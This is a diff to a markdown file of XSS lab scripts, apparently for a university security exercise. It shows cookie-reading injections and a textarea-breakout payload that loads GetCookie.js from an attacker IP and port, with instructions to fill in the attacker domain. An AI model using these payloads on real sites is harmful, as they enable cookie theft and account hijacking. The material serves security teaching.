@@ -1,12 +1,10 @@
 # Second Laboratory (XSS) Scripts
 
----
-
 ### Get Own Cookies On Search (Task 1.2):
 
 ```html
 <script>
-	document.write(document.cookie);
+    document.write(document.cookie);
 </script>
 ```
 
@@ -72,7 +70,8 @@
 
 ```html
 </textarea>
-    <script src="http://<IP>:<PORT>/GetCookie.js"></script>
+    <script src="http://<IP>:<PORT>/GetCookie.js">
+    </script>
 <textarea>
 ```
 
@@ -91,4 +90,3 @@ HTTP.send();
 - Fill <IP> & <PORT> (Attacker Domain)
 
 ---
-
